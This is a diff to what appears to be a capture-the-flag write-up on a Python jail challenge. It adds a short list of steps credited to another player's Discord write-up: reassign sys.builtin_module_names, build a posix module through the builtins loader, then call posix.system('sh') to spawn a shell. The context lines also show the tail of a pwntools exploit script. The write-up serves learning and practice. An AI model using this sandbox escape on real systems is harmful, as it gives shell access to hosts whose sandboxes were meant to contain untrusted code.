@@ -188,3 +188,10 @@ p.sendline(
 )
 p.interactive()
 ```
+
+Here is the attack steps used in @ayapi's writeup on Discord:
+
+1. Set `sys.builtin_module_names = ["posix"]`
+2. Create `posix` module via `posix = builtins.__loader__.create_module([builtins.__spec__ for builtins.__spec__.name in ["posix"]][0])` (learned from [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/))
+3. Call `posix.system("sh")`
+
